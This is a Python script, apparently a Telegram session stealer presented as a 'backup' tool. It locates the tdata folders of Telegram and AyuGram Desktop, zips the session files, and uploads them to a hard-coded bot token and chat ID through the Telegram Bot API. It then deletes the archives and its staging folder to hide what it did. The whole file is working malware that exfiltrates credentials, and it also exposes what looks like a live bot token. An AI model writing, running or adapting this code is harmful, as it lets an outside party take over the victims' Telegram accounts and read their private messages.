import os
import zipfile
import subprocess
import sys
import psutil
import requests
import shutil
import getpass
import asyncio

for pkg in ['psutil', 'requests']:
    try:
        __import__(pkg)
    except ImportError:
        subprocess.check_call([sys.executable, "-m", "pip", "install", pkg])

TELEGRAM_BOT_TOKEN = '8428496117:AAFY3Lcd5NobBWRLGGKwcZ17pwWDg1A6Tgk'
TELEGRAM_CHAT_ID = '7613525531'
MAX_FILE_SIZE_MB = 100
EXCLUDE_EXTENSIONS = ['.mp4', '.webm', '.jpg', '.jpeg', '.png', '.gif', '.ogg', '.mp3', '.partial', '.tmp', '.log']

EXCLUDE_DIRS = [
    'user_data',
    'emoji',
    'cache',
    'working',
    'media_cache'
]

APPDATA_BACKUP_DIR = os.path.join(os.getenv('APPDATA'), 'TDB')
os.makedirs(APPDATA_BACKUP_DIR, exist_ok=True)

def find_all_tdata():
    tdata_paths = {}
    for proc in psutil.process_iter(['name', 'exe']):
        try:
            name = proc.info['name'].lower()
            exe_path = proc.info['exe']
            if not exe_path:
                continue
            if 'telegram' in name:
                client = 'telegram'
            elif 'ayugram' in name:
                client = 'ayugram'
            else:
                continue
            tdata_path = os.path.join(os.path.dirname(exe_path), 'tdata')
            if os.path.exists(tdata_path):
                tdata_paths[client] = tdata_path
        except Exception:
            continue

    appdata = os.getenv('APPDATA')
    fallback_paths = {
        'telegram': os.path.join(appdata, 'Telegram Desktop', 'tdata'),
        'ayugram': os.path.join(appdata, 'Ayugram', 'tdata')
    }
    for client, path in fallback_paths.items():
        if client not in tdata_paths and os.path.exists(path):
            tdata_paths[client] = path

    return tdata_paths

def should_exclude(path, base):
    rel = os.path.relpath(path, base).replace('\\', '/').lower()
    for ex_dir in EXCLUDE_DIRS:
        if rel.startswith(ex_dir):
            return True
    ext = os.path.splitext(path)[1].lower()
    if ext in EXCLUDE_EXTENSIONS:
        return True
    try:
        if os.path.getsize(path) > 5 * 1024 * 1024:
            return True
    except Exception:
        return True
    return False

def create_archive(tdata_path, client_name):
    username = getpass.getuser()
    archive_name = f"{client_name}_{username}_tdata_backup.zip"
    archive_path = os.path.join(APPDATA_BACKUP_DIR, archive_name)

    with zipfile.ZipFile(archive_path, 'w', zipfile.ZIP_DEFLATED) as archive:
        for root, _, files in os.walk(tdata_path):
            for file in files:
                full_path = os.path.join(root, file)
                arcname = os.path.relpath(full_path, tdata_path)
                if should_exclude(full_path, tdata_path):
                    continue
                try:
                    with open(full_path, 'rb') as f:
                        data = f.read()
                    archive.writestr(arcname, data)
                except:
                    continue
    return archive_path

def send_to_telegram(token, chat_id, file_path, caption="📦 Telegram TDATA backup"):
    url = f"https://api.telegram.org/bot{token}/sendDocument"
    with open(file_path, 'rb') as f:
        files = {'document': (os.path.basename(file_path), f)}
        data = {'chat_id': chat_id, 'caption': caption}
        return requests.post(url, files=files, data=data)

async def main():
    tdata_dict = find_all_tdata()
    if not tdata_dict:
        return

    for client, path in tdata_dict.items():
        zip_file_path = create_archive(path, client)
        response = send_to_telegram(TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID, zip_file_path,
                                    caption=f"📦 {client.capitalize()} session backup")
        if response.status_code == 200:
            try:
                os.remove(zip_file_path)
            except:
                pass

    try:
        if os.path.exists(APPDATA_BACKUP_DIR):
            shutil.rmtree(APPDATA_BACKUP_DIR)
    except:
        pass

if __name__ == "__main__":
    asyncio.run(main())